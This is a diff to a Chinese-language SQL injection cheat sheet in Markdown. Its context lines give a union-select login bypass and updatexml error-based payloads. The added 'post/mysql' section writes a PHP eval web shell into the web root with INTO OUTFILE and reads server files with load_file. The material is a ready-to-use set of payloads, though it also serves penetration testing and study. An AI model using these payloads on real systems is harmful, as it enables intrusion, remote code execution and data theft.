@@ -23,7 +23,10 @@
 | `select * from user where username = '$name'` | 密码是 md5 方式, `-1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#`                                       |
 | \`uid\` in('1'); <br> \`uid\` in($id);        | 后面会补括号 <br> `1) or updatexml(1,concat(0x7e,version(),0x7e),1`<br>`1 or updatexml(1,concat(0x7e,version(),0x7e),1` |
 
-> > > > > > > fb0c8d90748fbc0f5a438e9bdd052281643010f0
+### post/mysql
+
+- 写入文件 `select "<?php @eval($_POST['cmd']);?>" into outfile "C://phpstudy/www/info.php"`
+- 读文件 `select load_file('C:/users/desktop.ini');`
 
 ### 2.布尔盲注
 
